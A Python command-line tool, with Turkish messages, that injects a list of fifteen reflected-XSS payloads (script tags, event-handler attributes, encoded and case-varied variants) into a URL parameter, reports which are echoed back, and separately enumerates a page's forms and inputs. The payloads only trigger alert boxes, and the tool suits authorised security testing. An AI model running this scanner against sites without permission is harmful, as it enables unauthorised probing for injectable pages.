import requests
import sys
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

def xss_test(url, param):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
    ]
    
    print(f"[*] XSS testi başlatılıyor: {url}")
    print(f"[*] Test edilen parametre: {param}\n")
    
    vulnerable = []
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            
            if payload in response.text or payload.lower() in response.text.lower():
                print(f"[!] POTANSİYEL XSS ZAFİYETİ BULUNDU!")
                print(f"    Payload: {payload}")
                print(f"    URL: {test_url}\n")
                vulnerable.append(payload)
            else:
                print(f"[-] Payload test edildi: {payload[:40]}...")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] İstek hatası: {e}")
    
    print("-" * 60)
    if vulnerable:
        print(f"\n[!] UYARI: {len(vulnerable)} potansiyel XSS zafiyeti tespit edildi!")
        print("[*] Bulunan payloadlar:")
        for v in vulnerable:
            print(f"    - {v}")
    else:
        print("\n[+] XSS zafiyeti tespit edilmedi.")

def scan_forms(url):
    print(f"\n[*] {url} adresindeki formlar taranıyor...\n")
    
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        
        if not forms:
            print("[-] Form bulunamadı.")
            return
        
        print(f"[+] {len(forms)} form bulundu.\n")
        
        for i, form in enumerate(forms, 1):
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            print(f"Form {i}:")
            print(f"  Action: {action}")
            print(f"  Method: {method}")
            print(f"  Input sayısı: {len(inputs)}")
            
            for inp in inputs:
                name = inp.get('name', '')
                input_type = inp.get('type', 'text')
                print(f"    - {name} ({input_type})")
            
            print()
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Bağlantı hatası: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım:")
        print("  XSS testi: python xss_scanner.py <url> <parametre>")
        print("  Form tarama: python xss_scanner.py <url>")
        print("\nÖrnek:")
        print("  python xss_scanner.py http://example.com/search.php q")
        print("  python xss_scanner.py http://example.com/login.php")
        sys.exit()
    
    url = sys.argv[1]
    
    if len(sys.argv) > 2:
        param = sys.argv[2]
        xss_test(url, param)
    else:
        scan_forms(url)
